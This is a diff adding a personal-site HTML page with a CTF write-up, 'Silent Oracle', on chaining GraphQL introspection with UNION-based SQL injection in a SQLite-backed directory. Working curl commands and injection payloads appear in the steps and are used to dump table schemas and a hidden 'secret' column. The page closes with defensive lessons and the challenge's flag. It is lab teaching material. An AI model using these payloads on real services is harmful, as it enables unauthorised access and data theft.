@@ -1,0 +1,350 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>andrxhh — Silent Oracle writeup</title>
+<link rel="stylesheet" href="../styles.css" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet" />
+<style>
+  /* writeup-only: readable body font for prose, mono kept for code + headers + chrome */
+  .prose p,
+  .prose ul li,
+  .prose blockquote {
+    font-family: 'IBM Plex Sans', system-ui, -apple-system, Segoe UI, sans-serif;
+    font-size: 16px;
+    line-height: 1.7;
+    letter-spacing: 0.005em;
+  }
+  .prose p.dim em,
+  .prose blockquote { font-style: normal; }
+  .prose ul li strong,
+  .prose p strong { font-weight: 600; }
+  /* code and inline-code stay monospace */
+  .prose code,
+  .prose pre,
+  .prose pre * { font-family: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, monospace; }
+
+  /* step markers — make them pop while scrolling */
+  .prose h2.step {
+    margin-top: 56px;
+    padding-top: 22px;
+    border-top: 1px dashed var(--border);
+    font-size: 20px;
+    color: var(--fg);
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+  .prose h2.step::before {
+    content: attr(data-step);
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    min-width: 38px;
+    height: 28px;
+    padding: 0 10px;
+    background: rgba(63, 185, 80, 0.12);
+    border: 1px solid var(--green);
+    border-radius: 4px;
+    color: var(--green);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+  }
+
+  /* writeup-only: screenshot styling */
+  .prose figure {
+    margin: 18px 0 22px;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    background: #0a1815;
+  }
+  .prose figure img {
+    display: block;
+    width: 100%;
+    height: auto;
+    cursor: zoom-in;
+    transition: opacity .15s ease;
+  }
+  .prose figure img:hover { opacity: 0.85; }
+
+  /* lightbox */
+  .lightbox {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.9);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 32px;
+    z-index: 100;
+    cursor: zoom-out;
+  }
+  .lightbox.open { display: flex; }
+  .lightbox img {
+    max-width: 100%;
+    max-height: 100%;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  }
+  .lightbox-close {
+    position: absolute;
+    top: 18px; right: 22px;
+    background: none;
+    border: none;
+    color: var(--fg-dim);
+    cursor: pointer;
+    font-family: inherit;
+    font-size: 14px;
+  }
+  .lightbox-close:hover { color: var(--green); }
+  .prose figcaption {
+    padding: 10px 14px;
+    color: var(--fg-dim);
+    font-size: 12.5px;
+    border-top: 1px dashed var(--border);
+    background: rgba(255,255,255,0.015);
+  }
+  .prose figcaption::before {
+    content: "// ";
+    color: var(--fg-muted);
+  }
+</style>
+</head>
+<body data-screen-label="03d Writeup detail">
+
+<header class="topbar">
+  <div class="topbar-inner">
+    <a class="brand" href="../index.html"><span class="prompt">$</span> andrxhh<span class="cursor"></span></a>
+    <nav class="nav">
+      <a href="../index.html">home</a>
+      <a href="../about.html">about</a>
+      <a class="active" href="../writeups.html">writeups</a>
+      <a href="../certs.html">certs</a>
+      <a href="../projects.html">projects</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap prose">
+  <a href="../writeup-platforms/writeups-v01d.html" class="back-link">← 0xV01D CTF writeups</a>
+  <p class="prompt-line"><span class="p">$</span> cat silent-oracle.md</p>
+  <h1>Silent Oracle</h1>
+  <div class="meta-bar">
+    <span>0xV01D CTF</span>
+    <span>web</span>
+    <span>medium</span>
+    <span>2026-05-19</span>
+  </div>
+
+  <p class="dim">
+    "A quiet internal directory exposes only a small public surface.
+    The useful answer are hidden behind how the service thinks about people and roles."
+  </p>
+
+  <p>
+    <strong>Vulnerability chain:</strong> GraphQL Introspection → SQL Injection → Hidden Column Exfiltration
+  </p>
+
+  <h2>reconnaissance</h2>
+  <p>
+    The landing page presents a "Shadow Directory" — a minimal search box with
+    a pre-filled GraphQL query and a <strong>Run Query</strong> button. The
+    public fields (<code>id</code>, <code>username</code>, <code>displayName</code>,
+    <code>role</code>, <code>bio</code>) look completely harmless.
+  </p>
+
+  <figure>
+    <img src="assets/01-shadow-directory.jpg" alt="Shadow Directory landing page with a GraphQL query editor and Run Query button" />
+    <figcaption>shadow directory landing page — the only public surface.</figcaption>
+  </figure>
+
+  <p>
+    Viewing the page source revealed the form POSTed to <code>/graphql</code>
+    with a parameter named <code>payload</code>. The backend was running a
+    GraphQL API on Python/Werkzeug.
+  </p>
+
+  <h2 class="step" data-step="01">graphql introspection</h2>
+  <p>
+    First thing I tried was a full schema dump via Burp — sending
+    <code>{ __schema { types { name } } }</code> against the endpoint.
+  </p>
+
+  <figure>
+    <img src="assets/02-burp-request-schema.jpg" alt="Burp Suite request panel showing POST /graphql with a __schema introspection query" />
+    <figcaption>burp request — full <code>__schema</code> introspection POST.</figcaption>
+  </figure>
+
+  <figure>
+    <img src="assets/03-burp-response-schema.jpg" alt="Burp Suite response showing all GraphQL types including User, ID, String, Query" />
+    <figcaption>response — every type the server knows about, including the <code>User</code> type.</figcaption>
+  </figure>
+
+  <p>
+    With the type list confirmed, I drilled into <code>Query</code> to find
+    the root-level fields:
+  </p>
+
+  <pre><span class="p">$</span> curl -X POST http://&lt;target&gt;/graphql \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{ __type(name: \"Query\") { fields { name } } }"}'</pre>
+
+  <figure>
+    <img src="assets/04-query-fields.jpg" alt="Terminal showing curl response listing two query fields: about and users" />
+    <figcaption>two root query fields: <code>about</code> and <code>users</code>.</figcaption>
+  </figure>
+
+  <p>Then enumerated the <code>User</code> type itself:</p>
+
+  <pre><span class="p">$</span> curl -X POST http://&lt;target&gt;/graphql \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{ __type(name: \"User\") { fields { name } } }"}'</pre>
+
+  <figure>
+    <img src="assets/05-user-fields.jpg" alt="Terminal showing the User type exposes id, username, displayName, role, bio" />
+    <figcaption>User type exposes: <code>id</code>, <code>username</code>, <code>displayName</code>, <code>role</code>, <code>bio</code>.</figcaption>
+  </figure>
+
+  <p>
+    Querying <code>about</code> returned:
+    <em>"Shadow Directory exposes a small public employee search API."</em>
+    Querying all users returned 4 entries — <code>guest</code>,
+    <code>mira</code>, <code>rakan</code>, and <code>admin</code> (id 4).
+  </p>
+
+  <h2 class="step" data-step="02">discovering sql injection</h2>
+  <p>
+    The <code>users(search:)</code> argument was passed unsanitized into a
+    SQL query. I crafted a UNION payload with five sentinel columns to map
+    where each value lands in the response:
+  </p>
+
+  <pre><span class="p">$</span> cat &gt; /tmp/query.json &lt;&lt; 'EOF'
+{"query":"{ users(search: \"' UNION SELECT 1,2,3,4,5--\") { id username displayName role bio } }"}
+EOF
+
+<span class="p">$</span> curl -X POST http://&lt;target&gt;/graphql \
+    -H "Content-Type: application/json" \
+    -d @/tmp/query.json</pre>
+
+  <figure>
+    <img src="assets/06-union-column-mapping.jpg" alt="Terminal showing UNION SELECT 1,2,3,4,5 response with column-to-field mapping" />
+    <figcaption>injected sentinel values land in the response — column mapping confirmed.</figcaption>
+  </figure>
+
+  <p>Injected values appeared in the response, confirming the column mapping:</p>
+
+  <pre><span class="c"># column → field</span>
+column 2  →  username
+column 3  →  displayName
+column 5  →  bio</pre>
+
+  <h2 class="step" data-step="03">database enumeration</h2>
+  <p>
+    Confirmed SQLite backend (MySQL's <code>information_schema</code>
+    returned <em>"no such table"</em>). Dumped all tables via
+    <code>sqlite_master</code>:
+  </p>
+
+  <pre>{"query":"{ users(search: \"' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'--\") { id username displayName role bio } }"}</pre>
+
+  <p>Tables found:</p>
+  <ul>
+    <li><code>users</code></li>
+    <li><code>audit_log</code></li>
+    <li><code>sqlite_sequence</code></li>
+  </ul>
+
+  <p>Dumped the users table schema by selecting <code>sql</code> instead of <code>name</code>:</p>
+
+  <pre><span class="p">$</span> cat &gt; /tmp/query.json &lt;&lt; 'EOF'
+{"query":"{ users(search: \"' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE type='table' AND name='users'--\") { id username displayName role bio } }"}
+EOF
+
+<span class="p">$</span> curl -X POST http://&lt;target&gt;/graphql \
+    -H "Content-Type: application/json" \
+    -d @/tmp/query.json</pre>
+
+  <figure>
+    <img src="assets/07-sqlite-master-dump.jpg" alt="Terminal showing the CREATE TABLE users statement leaked via UNION SELECT sql FROM sqlite_master, exposing a hidden secret column" />
+    <figcaption>the <code>CREATE TABLE</code> statement leaks the hidden <code>secret TEXT NOT NULL</code> column.</figcaption>
+  </figure>
+
+  <blockquote>
+    The schema revealed a <strong>secret TEXT NOT NULL</strong> column —
+    completely hidden from the GraphQL <code>User</code> type.
+  </blockquote>
+
+  <h2 class="step" data-step="04">extracting the flag</h2>
+  <p>With the hidden column name known, the final payload pulls <code>secret</code> directly:</p>
+
+  <pre><span class="p">$</span> cat &gt; /tmp/query.json &lt;&lt; 'EOF'
+{"query":"{ users(search: \"' UNION SELECT 1,secret,3,4,5 FROM users--\") { id username displayName role bio } }"}
+EOF
+
+<span class="p">$</span> curl -X POST http://&lt;target&gt;/graphql \
+    -H "Content-Type: application/json" \
+    -d @/tmp/query.json</pre>
+
+  <p>The <code>admin</code> user's <code>secret</code> field contained the flag.</p>
+
+  <figure>
+    <img src="assets/08-flag-extraction.jpg" alt="Terminal showing UNION SELECT secret FROM users dumping every user's secret column, with the admin's flag visible" />
+    <figcaption>every <code>secret</code> value dumped and shows in the <code>username</code>column value, there's the flag!</figcaption>
+  </figure>
+
+  <h2>vulnerability chain</h2>
+  <ul>
+    <li><strong>1. GraphQL introspection</strong> — mapped the schema, found <code>users(search:)</code> query.</li>
+    <li><strong>2. SQL injection</strong> — UNION SELECT via the unsanitized <code>search</code> argument.</li>
+    <li><strong>3. DB enumeration</strong> — <code>sqlite_master</code> dump revealed the hidden <code>secret</code> column.</li>
+    <li><strong>4. Flag extraction</strong> — <code>SELECT secret FROM users</code> returned the flag.</li>
+  </ul>
+
+  <h2>lessons learned</h2>
+  <ul>
+    <li>disable GraphQL introspection in production — it exposes your full API surface to attackers.</li>
+    <li>parameterize all SQL queries — never interpolate user input directly into SQL strings.</li>
+    <li>hidden database columns are not a security boundary — SQL injection bypasses schema-level restrictions entirely.</li>
+    <li>GraphQL does not sanitize resolvers — each resolver must validate and sanitize input independently.</li>
+    <li>character filtering (blocking <code>&lt;</code>, <code>{</code>) is not a substitute for proper input sanitization.</li>
+  </ul>
+
+  <h2>flag</h2>
+  <pre>0xV01D{13824a82-621f-49fd-9a8c-20a41fe7b2b8}</pre>
+
+  <div class="footer">
+    <a href="../writeup-platforms/writeups-v01d.html" style="color:var(--fg-muted);">← more 0xV01D writeups</a>
+    <span>// happy hacking</span>
+  </div>
+</main>
+
+<!-- lightbox -->
+<div class="lightbox" id="lightbox" role="dialog" aria-modal="true" aria-label="image viewer">
+  <button type="button" class="lightbox-close" id="lightboxClose" aria-label="close">[ esc ]</button>
+  <img id="lightboxImg" src="" alt="" />
+</div>
+
+<script>
+  const lb = document.getElementById('lightbox');
+  const lbImg = document.getElementById('lightboxImg');
+  const lbClose = document.getElementById('lightboxClose');
+  document.querySelectorAll('.prose figure img').forEach(img => {
+    img.addEventListener('click', () => {
+      lbImg.src = img.src;
+      lbImg.alt = img.alt;
+      lb.classList.add('open');
+    });
+  });
+  const closeLb = () => { lb.classList.remove('open'); lbImg.src = ''; };
+  lbClose.addEventListener('click', closeLb);
+  lb.addEventListener('click', (e) => { if (e.target === lb) closeLb(); });
+  document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeLb(); });
+</script>
+
+</body>
+</html>
